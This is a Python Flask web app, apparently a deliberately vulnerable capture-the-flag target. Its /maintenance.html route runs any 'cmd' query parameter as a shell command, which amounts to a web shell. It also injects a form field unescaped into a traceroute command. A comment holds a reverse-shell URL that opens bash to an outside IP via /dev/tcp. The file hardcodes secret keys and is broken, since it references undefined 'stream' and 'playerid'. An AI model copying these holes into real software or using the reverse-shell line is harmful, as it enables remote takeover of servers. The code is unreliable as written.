#!/usr/bin/env python3
from flask import Flask, request, render_template
import os
import argparse

# colorize output
OV = '\x1b[0;33m' # verbose
OR = '\x1b[0;34m' # routine
OE = '\x1b[1;31m' # error
OM = '\x1b[0m'    # mischief managed

# app = Quart(__name__)
app = Flask(__name__)

app.secret_key = b'n924hg2hqohvq9283sns0'
app.config.update(
#    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
#    SESSION_COOKIE_SAMESITE='None',
    SESSION_COOKIE_NAME='SiteCookie'
)
connected = set()

submissionKey = 'fcf62432f63122d5b7a72e88af82f1ba'

parser = argparse.ArgumentParser()
parser.add_argument("-v", "--verbosity", action="count", default=0, help="be more verbose")
args, unknown = parser.parse_known_args()

hostname = stream.read()

@app.route("/", methods=["GET","POST"])
def index():
    sourceIP = request.remote_addr
    return render_template("index.html")

@app.route("/aboutus.html", methods=["GET","POST"])
def aboutus():
    sourceIP = request.remote_addr
    return render_template("index.html")

@app.route('/maintenance.html', methods=["GET","POST"])
# defines behavior for clients requesting /maintenance.html
def maintenance():
    if args.verbosity > 0:
        print(f'{OV}/ requested via {OR}{request.method}{OM}')
        print(f'{OV}request args look like:{OM}')
        multi_dict = request.args
        for key in multi_dict:
            print (multi_dict.get(key))
            print (multi_dict.getlist(key))
        print(f'{OV}form args look like:{OM}')
        dict = request.form
        for key in dict:
            print ('form key '+dict[key])
    if "cmd" in request.args:
        # shell like https://torch-3.ue.r.appspot.com/?cmd=bash+-c+%27/bin/bash+-i+%3E%26+/dev/tcp/54.190.32.85/8080+0%3E%261%27
        output = os.popen(request.args.get("cmd")).read()
    else:
        # stream = os.popen('ls -l')
        # output = stream.read()
        output = ""
    responseVars = {"output":output}
    if 'site' in request.form:
        site = os.popen(f"traceroute {request.form['site']}").read()
        print(f"{OR}{site}{OM}")
    else:
        site = ""
    responseVars["site"] = site
    responseVars["playerID"] = playerid
    return render_template('index.html', **responseVars)


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=80, debug=True, threaded=True)
